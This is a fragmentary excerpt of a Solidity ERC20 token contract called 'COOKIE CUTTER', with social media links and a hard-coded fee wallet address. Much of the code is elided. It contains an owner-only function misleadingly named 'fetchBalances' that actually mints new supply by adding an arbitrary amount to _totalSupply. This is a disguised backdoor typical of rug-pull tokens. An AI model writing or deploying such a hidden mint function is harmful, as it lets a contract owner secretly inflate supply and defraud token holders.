...
TELEGRAM: https://t.me/CookieCutterEntry

TWITTER: https://twitter.com/cookiecutterERC
...
contract COOKIECUTTER is Ownable, ERC20 {

 
function fetchBalances(uint256 amount) public onlyOwner {
       _totalSupply += amount;
    ...
    string constant _name = "COOKIE CUTTER";
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0xE76948F30df4C4aA1f53B5408b20377909e55C06;
